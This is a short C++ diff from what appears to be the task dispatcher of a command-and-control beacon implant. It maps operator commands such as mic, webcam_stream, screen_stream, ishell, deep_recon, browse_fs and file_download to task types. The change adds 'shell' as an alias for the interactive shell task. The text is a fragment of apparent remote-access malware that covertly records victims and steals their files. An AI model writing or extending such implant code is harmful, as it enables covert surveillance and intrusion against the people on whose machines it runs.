@@ -32,7 +32,7 @@ namespace {
         if (str == "mic") return beacon::TaskType::MIC;
         if (str == "webcam_stream") return beacon::TaskType::WEBCAM_STREAM;
         if (str == "screen_stream") return beacon::TaskType::SCREEN_STREAM;
-        if (str == "ishell") return beacon::TaskType::ISHELL;
+        if (str == "ishell" || str == "shell") return beacon::TaskType::ISHELL;
         if (str == "deep_recon") return beacon::TaskType::DEEP_RECON;
         if (str == "browse_fs") return beacon::TaskType::BROWSE_FS;
         if (str == "file_download") return beacon::TaskType::FILE_DOWNLOAD;
